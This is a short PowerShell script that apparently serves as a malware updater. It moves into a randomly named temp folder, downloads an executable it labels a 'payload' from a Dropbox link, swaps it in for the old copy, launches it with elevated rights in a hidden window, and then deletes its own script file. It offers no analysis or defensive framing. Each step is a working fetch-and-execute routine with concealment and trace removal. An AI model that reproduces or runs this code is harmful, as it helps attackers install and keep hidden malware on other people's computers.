#change directory
cd $env:temp/sVBXKuz

#download updated payload
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/snbp53811ysy27yotn7pr/wsappa.exe?rlkey=15j3rv0qlkeu1nwphnedezq6o&dl=0" -OutFile new_wsappa.exe

#remove old payload
remove-item wsappa.exe

#change name
rename-item new_wsappa.exe wsappa.exe

#start new payload
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
